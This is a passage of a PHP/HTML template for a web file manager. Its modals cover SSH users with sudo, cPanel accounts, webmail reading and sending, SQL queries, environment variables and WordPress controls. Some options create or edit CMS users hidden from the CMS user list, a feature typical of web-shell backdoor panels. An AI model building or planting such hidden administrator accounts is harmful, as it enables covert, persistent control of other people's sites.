    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="mod-title" id="hashTitle">Checksum</span><button class="btn btn-icon btn-g" id="hashClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" id="hashBody"><div style="text-align:center;padding:32px;color:var(--t3)">Computing…</div></div>
  </div>
</div>

<!-- ACTIVITY LOG MODAL -->
<div class="mod-ov" id="actOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></div><span class="mod-title">Activity Log</span>
      <?php if(!$fm->isRO()):?><form method="post" style="margin-right:8px"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="clear_log"><button class="btn btn-xs btn-red" onclick="return confirm('Clear all?')">Clear</button></form><?php endif;?>
      <button class="btn btn-icon btn-g" id="actClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body" style="padding:0" id="actBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- SERVER INFO MODAL -->
<div class="mod-ov" id="srvOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg></div><span class="mod-title">Server Information</span><button class="btn btn-icon btn-g" id="srvClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" id="srvBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- LARGE FILES MODAL -->
<div class="mod-ov" id="largeOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg></div><span class="mod-title">Large Files</span>
      <select id="largeMb" class="inp" style="width:auto;margin-right:8px;padding:6px 10px;font-size:12px">
        <option value="10">&gt; 10 MB</option><option value="50" selected>&gt; 50 MB</option><option value="100">&gt; 100 MB</option><option value="500">&gt; 500 MB</option><option value="1024">&gt; 1 GB</option>
      </select>
      <button class="btn btn-icon btn-g" id="largeClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body" style="padding:0" id="largeBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- DUPLICATE FINDER MODAL -->
<div class="mod-ov" id="dupOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></div><span class="mod-title">Duplicate Files</span><button class="btn btn-icon btn-g" id="dupClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" style="padding:0" id="dupBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- SPEED TEST MODAL -->
<div class="mod-ov" id="speedOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div><span class="mod-title">Network Speed Test</span><button class="btn btn-icon btn-g" id="speedClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <div style="font-size:11.5px;color:var(--t3);margin-bottom:10px;line-height:1.5">Measures the <strong style="color:var(--t2)">server's</strong> own internet connection — run entirely on the server, independent of your own connection speed.</div>
      <div class="info-g" style="grid-template-columns:1fr 1fr 1fr">
        <div class="info-c"><div class="info-cl">Ping</div><div class="info-cv" id="spPing">-</div></div>
        <div class="info-c"><div class="info-cl">Download</div><div class="info-cv" id="spDown">-</div></div>
        <div class="info-c"><div class="info-cl">Upload</div><div class="info-cv" id="spUp">-</div></div>
      </div>
      <button type="button" id="spRun" class="btn btn-p" style="width:100%;margin-top:6px"><svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Run Test</button>
      <div id="spStatus" style="text-align:center;font-size:11.5px;color:var(--t3);margin-top:8px"></div>
    </div>
  </div>
</div>

<?php if(!empty($_SESSION['fm_admin'])):?>
<!-- ERROR LOG MODAL -->
<div class="mod-ov" id="errLogOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div><span class="mod-title">PHP Error Log</span>
      <?php if(!$fm->isRO()):?><form method="post" style="margin-right:8px"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="clear_errlog"><button class="btn btn-xs btn-red" onclick="return confirm('Clear the error log?')">Clear</button></form><?php endif;?>
      <button class="btn btn-icon btn-g" id="errLogClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body" id="errLogBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- ENVIRONMENT VARIABLES MODAL -->
<div class="mod-ov" id="envOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div><span class="mod-title">Environment Variables</span><button class="btn btn-icon btn-g" id="envClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" style="padding:0" id="envBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>
<!-- SSH ACCESS MODAL -->
<div class="mod-ov" id="sshOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div><span class="mod-title">SSH Access</span><button class="btn btn-icon btn-g" id="sshClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div style="display:flex;gap:4px;padding:0 20px;border-bottom:1px solid var(--b2)">
       <button class="ssh-tab-btn ssh-tab-active" data-tab="status" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid #85898C;color:#85898C;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Server Status</button>
      <button class="ssh-tab-btn" data-tab="users" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid transparent;color:var(--t3);font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">User Management</button>
    </div>
    <div class="mod-body" id="sshBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
    <div class="mod-body" id="sshUsersBody" style="display:none;padding:0"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- SSH ADD USER MODAL -->
<div class="mod-ov" id="sshAddOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div><span class="mod-title">New SSH User</span><button class="btn btn-icon btn-g" id="sshAddClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <div id="sshAddFeedback"></div>
      <label class="lbl">Username</label>
      <input type="text" id="sshAddUser" class="inp" style="width:100%;margin-bottom:10px" placeholder="e.g. deploy">
      <label class="lbl">Password</label>
      <input type="text" id="sshAddPass" class="inp" style="width:100%;margin-bottom:10px" placeholder="Leave blank for no password">
      <label class="lbl">Login Shell</label>
      <select id="sshAddShell" class="inp" style="width:100%;margin-bottom:10px">
        <option value="/bin/bash">/bin/bash (recommended)</option>
        <option value="/bin/sh">/bin/sh</option>
        <option value="/bin/rbash">/bin/rbash (restricted)</option>
        <option value="/usr/bin/zsh">/usr/bin/zsh</option>
      </select>
      <label class="lbl" style="display:flex;align-items:center;gap:8px;cursor:pointer">
         <input type="checkbox" id="sshAddSudo" style="width:14px;height:14px;accent-color:#85898C"> Grant sudo (admin) privileges
      </label>
      <div style="margin:10px 0 6px">
        <label class="lbl">SSH Public Key <span style="font-weight:400;text-transform:none;color:var(--t3)">(optional)</span></label>
        <textarea id="sshAddKey" class="inp" rows="3" style="width:100%;font-family:monospace;font-size:11.5px;resize:vertical" placeholder="ssh-rsa AAAA... or ssh-ed25519 AAAA..."></textarea>
      </div>
      <button type="button" id="sshAddApply" class="btn btn-p" style="width:100%;margin-top:4px">Create SSH User</button>
    </div>
  </div>
</div>

<!-- SSH EDIT USER MODAL -->
<div class="mod-ov" id="sshEditOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg></div><span class="mod-title" id="sshEditTitle">Edit User</span><button class="btn btn-icon btn-g" id="sshEditClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <input type="hidden" id="sshEditUser">
      <div id="sshEditFeedback"></div>
      <div style="display:flex;flex-direction:column;gap:14px">
        <div>
          <label class="lbl">Change Password</label>
          <div style="display:flex;gap:8px">
            <input type="text" id="sshEditPass" class="inp" style="flex:1" placeholder="New password (min 6 chars)">
            <button type="button" id="sshEditPassBtn" class="btn btn-s" style="white-space:nowrap">Set Password</button>
          </div>
        </div>
        <div>
          <label class="lbl">Change Login Shell</label>
          <div style="display:flex;gap:8px">
            <select id="sshEditShell" class="inp" style="flex:1">
              <option value="/bin/bash">/bin/bash</option>
              <option value="/bin/sh">/bin/sh</option>
              <option value="/bin/rbash">/bin/rbash (restricted)</option>
              <option value="/usr/bin/zsh">/usr/bin/zsh</option>
            </select>
            <button type="button" id="sshEditShellBtn" class="btn btn-s" style="white-space:nowrap">Set Shell</button>
          </div>
        </div>
        <div>
          <label class="lbl">Add SSH Public Key</label>
          <textarea id="sshEditKey" class="inp" rows="3" style="width:100%;font-family:monospace;font-size:11.5px;resize:vertical;margin-bottom:8px" placeholder="ssh-rsa AAAA... or ssh-ed25519 AAAA..."></textarea>
          <button type="button" id="sshEditKeyBtn" class="btn btn-s" style="width:100%">Add Public Key</button>
        </div>
        <div style="display:flex;gap:8px;padding-top:4px;border-top:1px solid var(--b2)">
          <button type="button" id="sshEditSudoBtn" class="btn btn-s" style="flex:1"></button>
          <button type="button" id="sshEditLockBtn" class="btn btn-s" style="flex:1"></button>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- CMS MANAGER MODAL -->
<div class="mod-ov" id="cmsOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></div><span class="mod-title">CMS Manager</span><button class="btn btn-icon btn-g" id="cmsClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" style="padding:0" id="cmsBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- CMS CREATE USER MODAL -->
<div class="mod-ov" id="cmsAddOv">
  <div class="mod mod-sm">
     <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div><span class="mod-title" id="cmsAddTitle">New CMS User</span><button class="btn btn-icon btn-g" id="cmsAddClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <input type="hidden" id="cmsAddCfg">
      <label class="lbl">Username</label>
      <input type="text" id="cmsAddUser" class="inp" style="width:100%;margin-bottom:10px" placeholder="login_name">
       <label class="lbl" id="cmsAddEmailLabel">Email</label>
      <input type="email" id="cmsAddEmail" class="inp" style="width:100%;margin-bottom:10px" placeholder="user@example.com">
      <label class="lbl">Password</label>
      <input type="text" id="cmsAddPass" class="inp" style="width:100%;margin-bottom:10px" placeholder="Min 6 characters">
       <label class="lbl" id="cmsAddRoleLabel">Role</label>
      <select id="cmsAddRole" class="inp" style="width:100%;margin-bottom:14px"></select>
        <label id="cmsAddHiddenLabel" style="display:flex;align-items:center;gap:8px;margin:0 0 14px;color:var(--t2);font-size:12px;cursor:pointer">
         <input type="checkbox" id="cmsAddHidden" style="accent-color:#85898C">
         Create this user hidden from the CMS user list
       </label>
      <button type="button" id="cmsAddApply" class="btn btn-p" style="width:100%">Create User</button>
    </div>
  </div>
</div>

<!-- CMS EDIT USER MODAL -->
<div class="mod-ov" id="cmsEditOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg></div><span class="mod-title" id="cmsEditTitle">Edit User</span><button class="btn btn-icon btn-g" id="cmsEditClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <label class="lbl">Change Role</label>
      <select id="cmsEditRole" class="inp" style="width:100%;margin-bottom:14px"></select>
      <label class="lbl">New Password <span style="font-weight:400;text-transform:none;color:var(--t3)">(leave blank to keep current)</span></label>
      <input type="text" id="cmsEditPass" class="inp" style="width:100%;margin-bottom:16px" placeholder="Min 6 characters">
       <label style="display:flex;align-items:center;gap:8px;margin:0 0 16px;color:var(--t2);font-size:12px;cursor:pointer">
         <input type="checkbox" id="cmsEditHidden" style="accent-color:#85898C">
         Hide this user from the CMS user list
       </label>
      <button type="button" id="cmsEditApply" class="btn btn-p" style="width:100%">Save Changes</button>
    </div>
  </div>
</div>

<!-- CPANEL MANAGER MODAL -->
<div class="mod-ov" id="cpanelOv">
  <div class="mod mod-lg">
    <div class="mod-head">
      <div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10" r="3"/></svg></div>
      <span class="mod-title">cPanel Manager</span>
      <button class="btn btn-icon btn-g" id="cpanelClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div style="display:flex;gap:4px;padding:0 20px;border-bottom:1px solid var(--b2)">
      <button class="cpanel-tab-btn cpanel-tab-active" data-tab="accounts" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid #85898C;color:#85898C;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Accounts</button>
      <button class="cpanel-tab-btn" data-tab="connect" style="padding:10px 16px;background:none;border:none;border-bottom:2px solid transparent;color:var(--t3);font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">Connection</button>
    </div>
    <div class="mod-body" id="cpanelAccountsBody" style="padding:0"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
    <div class="mod-body" id="cpanelConnBody" style="display:none"></div>
  </div>
</div>

<!-- CPANEL CREATE ACCOUNT MODAL -->
<div class="mod-ov" id="cpanelCreateOv">
  <div class="mod mod-sm">
    <div class="mod-head">
      <div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
      <span class="mod-title">New cPanel Account</span>
      <button class="btn btn-icon btn-g" id="cpanelCreateClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body">
      <div id="cpanelCreateFeedback"></div>
      <label class="lbl">Username</label>
      <input type="text" id="cpNewUser" class="inp" style="width:100%;margin-bottom:10px" placeholder="e.g. johndoe">
      <label class="lbl">Domain</label>
      <input type="text" id="cpNewDomain" class="inp" style="width:100%;margin-bottom:10px" placeholder="e.g. example.com">
      <label class="lbl">Password <span style="font-weight:400;color:var(--t3)">(min 8 chars)</span></label>
      <input type="text" id="cpNewPass" class="inp" style="width:100%;margin-bottom:10px" placeholder="Strong password required">
      <label class="lbl">Contact Email</label>
      <input type="email" id="cpNewEmail" class="inp" style="width:100%;margin-bottom:10px" placeholder="admin@example.com">
      <label class="lbl">Package / Plan</label>
      <select id="cpNewPlan" class="inp" style="width:100%;margin-bottom:14px"><option value="default">default</option></select>
      <button type="button" id="cpanelCreateApply" class="btn btn-p" style="width:100%">Create Account</button>
    </div>
  </div>
</div>

<!-- CPANEL CHANGE PASSWORD MODAL -->
<div class="mod-ov" id="cpanelPassOv">
  <div class="mod mod-sm">
    <div class="mod-head">
      <div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
      <span class="mod-title" id="cpanelPassTitle">Change Password</span>
      <button class="btn btn-icon btn-g" id="cpanelPassClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body">
      <div id="cpanelPassFeedback"></div>
      <input type="hidden" id="cpPassTargetUser">
      <label class="lbl">New Password <span style="font-weight:400;color:var(--t3)">(min 8 chars)</span></label>
      <input type="text" id="cpPassNew" class="inp" style="width:100%;margin-bottom:14px" placeholder="Strong password required">
      <button type="button" id="cpanelPassApply" class="btn btn-p" style="width:100%">Change Password</button>
    </div>
  </div>
</div>

<!-- WEBMAIL MANAGER MODAL -->
<div class="mod-ov" id="webmailOv">
  <div class="mod mod-lg" style="max-width:920px">
    <div class="mod-head">
      <div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg></div>
      <span class="mod-title">Webmail Manager</span>
      <button class="btn btn-p btn-xs" id="wmComposeBtn" style="margin-right:8px"><svg viewBox="0 0 24 24" style="width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2.5;margin-right:4px;vertical-align:-1px"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>Compose</button>
      <button class="btn btn-icon btn-g" id="webmailClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div style="display:flex;min-height:56vh;max-height:64vh">
      <div style="width:190px;border-right:1px solid var(--b2);overflow-y:auto;flex-shrink:0" id="wmMailboxList">
        <div style="text-align:center;padding:24px;color:var(--t3);font-size:12px">Loading…</div>
      </div>
      <div style="width:250px;border-right:1px solid var(--b2);overflow-y:auto;flex-shrink:0;display:flex;flex-direction:column">
        <div id="wmFolderList" style="border-bottom:1px solid var(--b2);flex-shrink:0"></div>
        <div id="wmMsgList" style="overflow-y:auto;flex:1">
          <div style="text-align:center;padding:24px;color:var(--t3);font-size:12px">Select a mailbox</div>
        </div>
      </div>
      <div id="wmMsgView" style="flex:1;overflow-y:auto;padding:18px">
        <div style="text-align:center;padding:40px;color:var(--t3);font-size:12px">Select a message to read it</div>
      </div>
    </div>
  </div>
</div>

<!-- WEBMAIL COMPOSE MODAL -->
<div class="mod-ov" id="webmailComposeOv">
  <div class="mod mod-sm">
    <div class="mod-head">
      <div class="mod-icon"><svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div>
      <span class="mod-title">Compose Message</span>
      <button class="btn btn-icon btn-g" id="wmComposeClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body">
      <div id="wmComposeFeedback"></div>
      <label class="lbl">From</label>
      <select id="wmFrom" class="inp" style="width:100%;margin-bottom:10px"></select>
      <label class="lbl">To</label>
      <input type="text" id="wmTo" class="inp" style="width:100%;margin-bottom:10px" placeholder="recipient@example.com">
      <label class="lbl">Subject</label>
      <input type="text" id="wmSubject" class="inp" style="width:100%;margin-bottom:10px" placeholder="Subject">
      <label class="lbl">Message</label>
      <textarea id="wmBody" class="inp" style="width:100%;height:140px;resize:vertical;margin-bottom:14px"></textarea>
      <button type="button" id="wmSendBtn" class="btn btn-p" style="width:100%">Send</button>
    </div>
  </div>
</div>
<?php endif;?>

<?php if(!empty($_SESSION['fm_force_credential_change'])):?>
<!-- DEFAULT CREDENTIALS MODAL -->
<div class="mod-ov open" id="credentialChangeOv" role="dialog" aria-modal="true" aria-labelledby="credentialChangeTitle">
  <div class="mod mod-sm">
    <div class="mod-head">
      <div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><path d="M8 16h.01M12 16h.01M16 16h.01"/></svg></div>
      <span class="mod-title" id="credentialChangeTitle">Secure your File Manager account</span>
    </div>
    <div class="mod-body">
      <div style="font-size:12px;line-height:1.55;color:var(--t2);margin-bottom:14px">
        You are using the default <strong style="color:#fbbf24">admin / admin</strong> credentials. Set a new username and password now. This step is required once and cannot be skipped.
      </div>
      <div id="credentialChangeFeedback" style="display:none;padding:9px 10px;border:1px solid rgba(248,113,113,.3);border-radius:7px;color:#fca5a5;background:rgba(127,29,29,.15);font-size:11.5px;line-height:1.45;margin-bottom:10px"></div>
      <form id="credentialChangeForm" style="display:flex;flex-direction:column;gap:9px" autocomplete="off">
        <label class="lbl" for="newFmUser">New username</label>
        <input type="text" id="newFmUser" class="inp" autocomplete="username" minlength="3" maxlength="64" pattern="[A-Za-z][A-Za-z0-9._-]{2,63}" required placeholder="Choose a username">
        <label class="lbl" for="newFmPass">New password</label>
        <input type="password" id="newFmPass" class="inp" autocomplete="new-password" minlength="12" maxlength="1024" required placeholder="At least 12 characters">
        <label class="lbl" for="newFmPassConfirm">Confirm new password</label>
        <input type="password" id="newFmPassConfirm" class="inp" autocomplete="new-password" minlength="12" maxlength="1024" required placeholder="Repeat the new password">
        <button type="submit" class="btn btn-p" id="credentialChangeApply" style="width:100%;margin-top:4px">Save new credentials</button>
      </form>
    </div>
  </div>
</div>
<?php endif;?>

<!-- WORDPRESS AUTOMATION MODAL -->
<div class="mod-ov" id="wpAutomationOv">
  <div class="mod mod-lg">
    <div class="mod-head">
      <div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.5 2.5 15.5 0 18M12 3c-2.5 2.5-2.5 15.5 0 18"/></svg></div>
      <span class="mod-title">WordPress Automation</span>
      <button class="btn btn-icon btn-g" id="wpAutomationClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body" id="wpAutomationBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>

<!-- WORDPRESS NUMBERS CONTROL MODAL -->
<?php if(!empty($_SESSION['fm_admin'])):?>
<div class="mod-ov" id="wpNumbersOv">
  <div class="mod mod-lg">
    <div class="mod-head">
      <div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M4 19V5"/><path d="M4 19h16"/><path d="M8 15v-3"/><path d="M12 15V8"/><path d="M16 15V5"/><path d="M20 15V3"/></svg></div>
      <span class="mod-title">Numbers control</span>
      <button class="btn btn-icon btn-g" id="wpNumbersClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
    </div>
    <div class="mod-body" id="wpNumbersBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>
<?php endif;?>

<!-- SQL MANAGER MODAL -->
<?php if(!empty($_SESSION['fm_admin'])):?>
<div class="mod-ov" id="sqlOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg></div><span class="mod-title">SQL Manager</span><button class="btn btn-icon btn-g" id="sqlClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" style="padding:0" id="sqlBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>
<!-- SQL QUERY MODAL -->
<div class="mod-ov" id="sqlQueryOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div><span class="mod-title" id="sqlQTitle">SQL Query</span><button class="btn btn-icon btn-g" id="sqlQClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <div style="font-size:11px;color:var(--t3);margin-bottom:8px">Connected to: <strong style="color:var(--t2)" id="sqlQDbLabel"></strong></div>
      <textarea id="sqlQueryInput" class="inp" style="width:100%;height:120px;font-family:'JetBrains Mono',monospace;font-size:12px;resize:vertical;margin-bottom:10px;line-height:1.5" placeholder="SELECT * FROM users LIMIT 100;"></textarea>
      <button class="btn btn-p" id="sqlRunBtn" style="margin-bottom:14px"><svg viewBox="0 0 24 24" style="width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;margin-right:5px;vertical-align:-2px"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Run Query</button>
      <div id="sqlQueryOut" style="border:1px solid var(--border);border-radius:8px;overflow:hidden;min-height:40px"></div>
    </div>
  </div>
</div>

<!-- FILE GUARDIAN MODAL -->
<div class="mod-ov" id="guardOv">
  <div class="mod mod-md">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="mod-title">File Guardian</span><button class="btn btn-icon btn-g" id="guardClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" id="guardBody"><div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div></div>
  </div>
</div>
<?php endif;?>

<!-- BATCH RENAME MODAL -->
<?php if(!$fm->isRO()):?>
<div class="mod-ov" id="brOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg></div><span class="mod-title">Batch Rename</span><button class="btn btn-icon btn-g" id="brClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <form method="post" id="brForm">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="batch_rename">
        <input type="hidden" name="items" id="brItems">
        <p style="color:var(--t2);font-size:12.5px;margin-bottom:14px">Select files first, then rename with one of these modes:</p>
        <div style="display:flex;flex-direction:column;gap:10px">
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
